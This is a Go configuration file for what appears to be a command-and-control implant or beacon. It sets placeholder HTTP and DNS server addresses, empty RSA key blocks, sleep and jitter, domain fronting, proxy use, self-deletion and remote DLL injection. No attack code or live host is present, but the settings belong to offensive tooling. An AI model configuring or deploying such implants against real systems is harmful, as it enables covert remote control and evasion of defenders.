package config

import (
	"time"
)

var (
	// HTTP(s) config
	// change protocol to switch to http(s)
	Host = "https://ip:port"

	// DNS config
	IsDNS = true
	// ServerBaseDomain is the base dns domain name, dot is required
	ServerBaseDomain = ".test.unknown."
	// DnsServer is C2 server addr ip:53
	DnsServer = "ip:port"

	// RsaPublicKey only used when first send meta info to server
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----`)
	// RsaPrivateKey private key is not needed
	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----`)

	IgnoreSSLVerify = true
	//TimeOut seconds
	TimeOut time.Duration = 10 * time.Second
	// DownloadSize is size of download, 5M
	DownloadSize = 1024 * 1024 * 5
	/* custom options here  */
	// change remote dll inject to inject self, but execute asm will not get echo
	InjectSelf    = false
	DeleteSelf    = true
	Support41Plus = true
	// if debug is false there will be no output
	Debug      = true
	TimeLayout = "2006-01-02 15:04:05"
	EndTime    = ""
	// proxy config
	ProxyUrl = ""
	// domain fronting host
	DomainFrontHost = ""
	// WaitTime unit Millisecond
	WaitTime = 5 * 1000
	// Jitter unit percent
	Jitter = 0
)
